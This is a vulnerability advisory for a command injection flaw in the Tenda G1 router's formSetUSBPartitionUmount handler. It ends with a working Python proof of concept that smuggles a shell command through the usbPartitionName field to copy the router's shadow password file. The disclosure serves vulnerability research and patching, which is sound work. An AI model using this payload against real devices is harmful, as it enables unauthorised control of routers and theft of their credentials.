  # Tenda router formSetUSBPartitionUmount function any command execution vulnerability

> vendor:Tenda
>
> product:G1
>
> version:v3.0 v16.0.7.4(1584)
>
> type:Command Execution

## Vulnerability Description

Tenda G1 v3.0 v16.0.7.4(1584) were discovered to contain a any command execution via the usbPartitionName parameter in the formSetUSBPartitionUmount function.

## Vulnerability Details

In this function, use the cJSON_GetString function to obtain the "usbPartitionName" variable from the JSON object and assign it to v6. It is directly passed to the execution function doSystemCmd for execution without proper filtering or escaping processing. Attackers may construct malicious usbPartitionName value to execute arbitrary commands when doSystemCmd is called.

<img width="547" alt="屏幕截图 2024-03-07 111339" src="https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/8e827cd8-9122-49b3-a204-d657eca74b96">


## POC
    import requests

    url = "http://192.168.244.130/goform/SetUSBPartitionUmount"
    cmds = ";cp /etc_ro/shadow /usr/bin;"


    payload = {'usbPartitionName': cmds}
    r = requests.post(url, data=payload)
    print(r.status_code)
    print(r.content)
    
